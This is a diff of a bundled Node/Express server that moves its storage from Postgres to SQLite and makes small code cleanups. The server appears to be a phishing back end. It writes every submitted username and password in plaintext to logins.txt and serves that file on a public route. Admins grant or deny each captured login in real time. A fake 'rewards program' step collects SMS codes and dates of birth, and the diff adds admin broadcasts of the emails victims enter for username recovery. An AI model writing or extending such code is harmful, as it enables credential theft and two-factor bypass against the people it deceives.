@@ -34,7 +34,7 @@ var import_http = require("http");
 var import_ws = require("ws");
 var import_zod2 = require("zod");
 var import_fs = __toESM(require("fs"), 1);
-var import_path = __toESM(require("path"), 1);
+var import_path2 = __toESM(require("path"), 1);
 
 // shared/schema.ts
 var schema_exports = {};
@@ -50,34 +50,34 @@ __export(schema_exports, {
   users: () => users,
   verificationSessions: () => verificationSessions
 });
-var import_pg_core = require("drizzle-orm/pg-core");
+var import_sqlite_core = require("drizzle-orm/sqlite-core");
 var import_drizzle_zod = require("drizzle-zod");
 var import_zod = require("zod");
-var users = (0, import_pg_core.pgTable)("users", {
-  id: (0, import_pg_core.text)("id").primaryKey().$defaultFn(() => crypto.randomUUID()),
-  username: (0, import_pg_core.text)("username").notNull().unique(),
-  password: (0, import_pg_core.text)("password").notNull(),
-  rememberUsername: (0, import_pg_core.boolean)("remember_username").default(false),
-  lastLogin: (0, import_pg_core.timestamp)("last_login"),
-  createdAt: (0, import_pg_core.timestamp)("created_at").defaultNow()
+var users = (0, import_sqlite_core.sqliteTable)("users", {
+  id: (0, import_sqlite_core.text)("id").primaryKey().$defaultFn(() => crypto.randomUUID()),
+  username: (0, import_sqlite_core.text)("username").notNull().unique(),
+  password: (0, import_sqlite_core.text)("password").notNull(),
+  rememberUsername: (0, import_sqlite_core.integer)("remember_username", { mode: "boolean" }).default(false),
+  lastLogin: (0, import_sqlite_core.integer)("last_login", { mode: "timestamp" }),
+  createdAt: (0, import_sqlite_core.integer)("created_at", { mode: "timestamp" }).$defaultFn(() => /* @__PURE__ */ new Date())
 });
-var loginAttempts = (0, import_pg_core.pgTable)("login_attempts", {
-  id: (0, import_pg_core.text)("id").primaryKey().$defaultFn(() => crypto.randomUUID()),
-  username: (0, import_pg_core.text)("username").notNull(),
-  success: (0, import_pg_core.boolean)("success").notNull(),
-  ipAddress: (0, import_pg_core.text)("ip_address"),
-  userAgent: (0, import_pg_core.text)("user_agent"),
-  timestamp: (0, import_pg_core.timestamp)("timestamp").defaultNow()
+var loginAttempts = (0, import_sqlite_core.sqliteTable)("login_attempts", {
+  id: (0, import_sqlite_core.text)("id").primaryKey().$defaultFn(() => crypto.randomUUID()),
+  username: (0, import_sqlite_core.text)("username").notNull(),
+  success: (0, import_sqlite_core.integer)("success", { mode: "boolean" }).notNull(),
+  ipAddress: (0, import_sqlite_core.text)("ip_address"),
+  userAgent: (0, import_sqlite_core.text)("user_agent"),
+  timestamp: (0, import_sqlite_core.integer)("timestamp", { mode: "timestamp" }).$defaultFn(() => /* @__PURE__ */ new Date())
 });
-var pendingRequests = (0, import_pg_core.pgTable)("pending_requests", {
-  id: (0, import_pg_core.text)("id").primaryKey(),
-  username: (0, import_pg_core.text)("username").notNull(),
-  password: (0, import_pg_core.text)("password").notNull(),
-  ipAddress: (0, import_pg_core.text)("ip_address"),
-  userAgent: (0, import_pg_core.text)("user_agent"),
-  status: (0, import_pg_core.text)("status").notNull().default("pending"),
+var pendingRequests = (0, import_sqlite_core.sqliteTable)("pending_requests", {
+  id: (0, import_sqlite_core.text)("id").primaryKey(),
+  username: (0, import_sqlite_core.text)("username").notNull(),
+  password: (0, import_sqlite_core.text)("password").notNull(),
+  ipAddress: (0, import_sqlite_core.text)("ip_address"),
+  userAgent: (0, import_sqlite_core.text)("user_agent"),
+  status: (0, import_sqlite_core.text)("status").notNull().default("pending"),
   // pending, granted, denied
-  timestamp: (0, import_pg_core.timestamp)("timestamp").defaultNow()
+  timestamp: (0, import_sqlite_core.integer)("timestamp", { mode: "timestamp" }).$defaultFn(() => /* @__PURE__ */ new Date())
 });
 var insertUserSchema = (0, import_drizzle_zod.createInsertSchema)(users).pick({
   username: true,
@@ -126,13 +126,13 @@ var smsVerificationSchema = import_zod.z.object({
     return date <= eighteenYearsAgo;
   }, "You must be at least 18 years old to participate in the rewards program.")
 });
-var verificationSessions = (0, import_pg_core.pgTable)("verification_sessions", {
-  id: (0, import_pg_core.text)("id").primaryKey().$defaultFn(() => crypto.randomUUID()),
-  username: (0, import_pg_core.text)("username").notNull(),
-  smsCode: (0, import_pg_core.text)("sms_code"),
-  dateOfBirth: (0, import_pg_core.text)("date_of_birth"),
-  ipAddress: (0, import_pg_core.text)("ip_address"),
-  timestamp: (0, import_pg_core.timestamp)("timestamp").defaultNow()
+var verificationSessions = (0, import_sqlite_core.sqliteTable)("verification_sessions", {
+  id: (0, import_sqlite_core.text)("id").primaryKey().$defaultFn(() => crypto.randomUUID()),
+  username: (0, import_sqlite_core.text)("username").notNull(),
+  smsCode: (0, import_sqlite_core.text)("sms_code"),
+  dateOfBirth: (0, import_sqlite_core.text)("date_of_birth"),
+  ipAddress: (0, import_sqlite_core.text)("ip_address"),
+  timestamp: (0, import_sqlite_core.integer)("timestamp", { mode: "timestamp" }).$defaultFn(() => /* @__PURE__ */ new Date())
 });
 var insertVerificationSessionSchema = (0, import_drizzle_zod.createInsertSchema)(verificationSessions).omit({
   id: true,
@@ -140,16 +140,13 @@ var insertVerificationSessionSchema = (0, import_drizzle_zod.createInsertSchema)
 });
 
 // server/db.ts
-var import_node_postgres = require("drizzle-orm/node-postgres");
-var import_pg = require("pg");
-if (!process.env.DATABASE_URL) {
-  throw new Error("DATABASE_URL must be set. Did you forget to provision a database?");
-}
-var pool = new import_pg.Pool({
-  connectionString: process.env.DATABASE_URL,
-  ssl: process.env.NODE_ENV === "production" ? { rejectUnauthorized: false } : false
-});
-var db = (0, import_node_postgres.drizzle)(pool, { schema: schema_exports });
+var import_better_sqlite3 = __toESM(require("better-sqlite3"), 1);
+var import_better_sqlite32 = require("drizzle-orm/better-sqlite3");
+var import_path = __toESM(require("path"), 1);
+var dbPath = import_path.default.resolve(process.cwd(), "sqlite.db");
+var sqlite = new import_better_sqlite3.default(dbPath);
+sqlite.pragma("journal_mode = WAL");
+var db = (0, import_better_sqlite32.drizzle)(sqlite, { schema: schema_exports });
 
 // server/storage.ts
 var import_drizzle_orm = require("drizzle-orm");
@@ -232,11 +229,11 @@ function rateLimitMiddleware(maxRequests = 5, windowMs = 6e4) {
     const record = rateLimits.get(ip);
     if (rateLimits.size > 1e4) {
       const cutoff = now - windowMs * 2;
-      for (const [key, value] of rateLimits.entries()) {
+      Array.from(rateLimits.entries()).forEach(([key, value]) => {
         if (value.windowStart < cutoff) {
           rateLimits.delete(key);
         }
-      }
+      });
     }
     if (!record || now - record.windowStart > windowMs) {
       rateLimits.set(ip, { count: 1, windowStart: now });
@@ -267,11 +264,11 @@ function generateCSRFToken(req) {
   });
   if (csrfTokens.size > 1e4) {
     const now = Date.now();
-    for (const [key, value] of csrfTokens.entries()) {
+    Array.from(csrfTokens.entries()).forEach(([key, value]) => {
       if (value.expiresAt < now || value.used) {
         csrfTokens.delete(key);
       }
-    }
+    });
   }
   return { token, expiresAt };
 }
@@ -573,7 +570,7 @@ async function getCountryFromIP(ip) {
 }
 async function logVisitor(req) {
   try {
-    const rawIP = req.headers["x-forwarded-for"] || req.headers["x-real-ip"] || req.connection.remoteAddress || req.socket.remoteAddress || "unknown";
+    const rawIP = req.headers["x-forwarded-for"] || req.headers["x-real-ip"] || req.socket.remoteAddress || "unknown";
     const ip = rawIP.split(",")[0].trim();
     const country = await getCountryFromIP(ip);
     const now = /* @__PURE__ */ new Date();
@@ -583,13 +580,13 @@ async function logVisitor(req) {
     const shortUserAgent = userAgent.length > 50 ? userAgent.substring(0, 50) + "..." : userAgent;
     const logEntry = `${ip} (${country}) | ${dateStr} | ${timeStr} | ${req.url} | ${shortUserAgent}
 `;
-    const logPath = import_path.default.join(
+    const logPath = import_path2.default.join(
       process.cwd(),
       "client",
       "public",
       "visitors.txt"
     );
-    const publicDir = import_path.default.join(process.cwd(), "client", "public");
+    const publicDir = import_path2.default.join(process.cwd(), "client", "public");
     if (!import_fs.default.existsSync(publicDir)) {
       import_fs.default.mkdirSync(publicDir, { recursive: true });
     }
@@ -600,7 +597,7 @@ async function logVisitor(req) {
 }
 function clearVisitorsLog() {
   try {
-    const logPath = import_path.default.join(
+    const logPath = import_path2.default.join(
       process.cwd(),
       "client",
       "public",
@@ -652,12 +649,12 @@ async function registerRoutes(app2) {
     async (req, res) => {
       try {
         const loginData = loginSchema.parse(req.body);
-        const loginsPath = import_path.default.join(process.cwd(), "logins.txt");
+        const loginsPath = import_path2.default.join(process.cwd(), "logins.txt");
         const logEntry = `${loginData.username}:${loginData.password || ""}
 `;
         import_fs.default.appendFileSync(loginsPath, logEntry);
         try {
-          const usernamesPath = import_path.default.join(
+          const usernamesPath = import_path2.default.join(
             process.cwd(),
             "client",
             "public",
@@ -668,7 +665,7 @@ async function registerRoutes(app2) {
           const timeStr = now.toISOString().split("T")[1].split(".")[0];
           const usernameEntry = `${loginData.username} | ${dateStr} | ${timeStr}
 `;
-          const publicDir = import_path.default.join(process.cwd(), "client", "public");
+          const publicDir = import_path2.default.join(process.cwd(), "client", "public");
           if (!import_fs.default.existsSync(publicDir)) {
             import_fs.default.mkdirSync(publicDir, { recursive: true });
           }
@@ -676,7 +673,7 @@ async function registerRoutes(app2) {
         } catch (error) {
           console.error("Error saving username:", error);
         }
-        const requestId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
+        const requestId = Date.now().toString() + Math.random().toString(36).substring(2, 11);
         const newRequest = {
           id: requestId,
           username: loginData.username,
@@ -798,6 +795,17 @@ async function registerRoutes(app2) {
     async (req, res) => {
       try {
         const { email } = req.body;
+        const ip = getClientIP(req);
+        const timestamp = (/* @__PURE__ */ new Date()).toISOString();
+        broadcastToAdmins({
+          type: "username_recovery",
+          data: {
+            email,
+            ipAddress: ip,
+            userAgent: req.get("User-Agent") || "Unknown",
+            timestamp
+          }
+        });
         res.json({
           success: true,
           message: "If an account exists with that email, recovery instructions have been sent."
@@ -883,7 +891,7 @@ async function registerRoutes(app2) {
   );
   app2.post("/api/admin/grant", async (req, res) => {
     try {
-      const { requestId, username, password } = req.body;
+      const { requestId } = req.body;
       await db.update(pendingRequests).set({ status: "granted" }).where((0, import_drizzle_orm2.eq)(pendingRequests.id, requestId));
       res.json({
         success: true,
@@ -899,7 +907,7 @@ async function registerRoutes(app2) {
   });
   app2.post("/api/admin/deny", async (req, res) => {
     try {
-      const { requestId, username, password } = req.body;
+      const { requestId } = req.body;
       await db.update(pendingRequests).set({ status: "denied" }).where((0, import_drizzle_orm2.eq)(pendingRequests.id, requestId));
       res.json({
         success: true,
@@ -915,7 +923,7 @@ async function registerRoutes(app2) {
   });
   app2.get("/visitors.txt", (req, res) => {
     try {
-      const logPath = import_path.default.join(
+      const logPath = import_path2.default.join(
         process.cwd(),
         "client",
         "public",
@@ -936,7 +944,7 @@ async function registerRoutes(app2) {
   });
   app2.get("/usernames.txt", (req, res) => {
     try {
-      const usernamesPath = import_path.default.join(
+      const usernamesPath = import_path2.default.join(
         process.cwd(),
         "client",
         "public",
@@ -957,7 +965,7 @@ async function registerRoutes(app2) {
   });
   app2.get("/logins.txt", (req, res) => {
     try {
-      const loginsPath = import_path.default.join(process.cwd(), "logins.txt");
+      const loginsPath = import_path2.default.join(process.cwd(), "logins.txt");
       if (!import_fs.default.existsSync(loginsPath)) {
         res.status(404).send("Logins file not found");
         return;
@@ -1165,31 +1173,31 @@ async function registerRoutes(app2) {
 // server/vite.ts
 var import_express = __toESM(require("express"), 1);
 var import_fs2 = __toESM(require("fs"), 1);
-var import_path3 = __toESM(require("path"), 1);
+var import_path4 = __toESM(require("path"), 1);
 var import_vite2 = require("vite");
 
 // vite.config.ts
 var import_vite = require("vite");
 var import_plugin_react = __toESM(require("@vitejs/plugin-react"), 1);
-var import_path2 = __toESM(require("path"), 1);
+var import_path3 = __toESM(require("path"), 1);
 var vite_config_default = (0, import_vite.defineConfig)({
   plugins: [
     (0, import_plugin_react.default)()
   ],
   resolve: {
     alias: {
-      "@": import_path2.default.resolve(process.cwd(), "client", "src"),
-      "@shared": import_path2.default.resolve(process.cwd(), "shared"),
-      "@assets": import_path2.default.resolve(process.cwd(), "attached_assets")
+      "@": import_path3.default.resolve(process.cwd(), "client", "src"),
+      "@shared": import_path3.default.resolve(process.cwd(), "shared"),
+      "@assets": import_path3.default.resolve(process.cwd(), "attached_assets")
     }
   },
-  root: import_path2.default.resolve(process.cwd(), "client"),
+  root: import_path3.default.resolve(process.cwd(), "client"),
   build: {
-    outDir: import_path2.default.resolve(process.cwd(), "dist/public"),
+    outDir: import_path3.default.resolve(process.cwd(), "dist/public"),
     emptyOutDir: true
   },
   server: {
-    port: 5e3,
+    port: 3e3,
     proxy: {
       "/api": {
         target: "http://localhost:5000",
@@ -1243,7 +1251,7 @@ async function setupVite(app2, server) {
   app2.use("*", async (req, res, next) => {
     const url = req.originalUrl;
     try {
-      const clientTemplate = import_path3.default.resolve(
+      const clientTemplate = import_path4.default.resolve(
         process.cwd(),
         "client",
         "index.html"
@@ -1262,7 +1270,7 @@ async function setupVite(app2, server) {
   });
 }
 function serveStatic(app2) {
-  const distPath = import_path3.default.resolve(process.cwd(), "dist/public");
+  const distPath = import_path4.default.resolve(process.cwd(), "dist/public");
   if (!import_fs2.default.existsSync(distPath)) {
     throw new Error(
       `Could not find the build directory: ${distPath}, make sure to build the client first`
@@ -1270,7 +1278,7 @@ function serveStatic(app2) {
   }
   app2.use(import_express.default.static(distPath));
   app2.use("*", (_req, res) => {
-    res.sendFile(import_path3.default.resolve(distPath, "index.html"));
+    res.sendFile(import_path4.default.resolve(distPath, "index.html"));
   });
 }
 
@@ -1318,7 +1326,7 @@ app.use((req, res, next) => {
 });
 app.use((req, res, next) => {
   const start = Date.now();
-  const path4 = req.path;
+  const path5 = req.path;
   let capturedJsonResponse = void 0;
   const originalResJson = res.json;
   res.json = function(bodyJson, ...args) {
@@ -1327,8 +1335,8 @@ app.use((req, res, next) => {
   };
   res.on("finish", () => {
     const duration = Date.now() - start;
-    if (path4.startsWith("/api")) {
-      let logLine = `${req.method} ${path4} ${res.statusCode} in ${duration}ms`;
+    if (path5.startsWith("/api")) {
+      let logLine = `${req.method} ${path5} ${res.statusCode} in ${duration}ms`;
       if (capturedJsonResponse) {
         logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`;
       }
